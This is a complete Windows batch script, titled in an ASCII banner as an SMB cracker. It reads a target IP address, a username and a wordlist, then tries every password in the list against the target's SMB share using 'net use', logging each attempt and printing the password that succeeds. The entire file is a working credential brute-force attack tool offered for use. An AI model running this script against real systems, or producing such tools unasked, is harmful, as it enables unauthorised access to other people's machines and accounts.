@echo off
cls

set/a count=0

echo    __      _____ _  _ ___   _____      _____     ___ __  __ ___
echo    \ \    / /_ _^| \^| ^|   \ / _ \ \    / / __^|   / __^|  \/  ^| _ )
echo     \ \/\/ / ^| ^|^|    ^| ^|) ^| (_) \ \/\/ /\__ \   \__ \ ^|\/^| ^| _ \
echo      \_/\_/ ^|___^|_^|\_^|___/ \___/ \_/\_/ ^|___/   ^|___/_^|  ^|_^|___/
echo                 ___ ___    _   ___ _  _____ ___
echo                / __^| _ \  /_\ / __^| ^|/ / __^| _ \
echo               ^| (__^|   / / _ \ (__^|   ^<^| _^|^|   /
echo                \___^|_^|_\/_/ \_\___^|_^|\_\___^|_^|_\
echo.
set/p "ipaddr=IP Address: "
set/p "user=Username: "
set/p "path=Path to wordlist: "

IF NOT EXIST "%path%" (
    echo.
    echo File not found^!
    exit /b
)

echo.
echo Ready? Strike ^<ENTER^> to crack and ^<CTRL+C^> to end...
pause >nul
echo.

setlocal EnableDelayedExpansion

FOR /F "delims=" %%A IN (%path%) DO (
    set "password=%%A"
    set/a count=!count!+1

    echo ^[Login Attempt ^#!count!^] !ipaddr!@!user!:!password!
    
    net use \\!ipaddr! /user:!user! !password! >nul 2>&1

    IF /I !ERRORLEVEL! EQU 0 (
        echo.
        echo Password^: !password!
        pause >nul
        exit /b
    )
)

echo.
echo Done. Nothing found...
exit /b
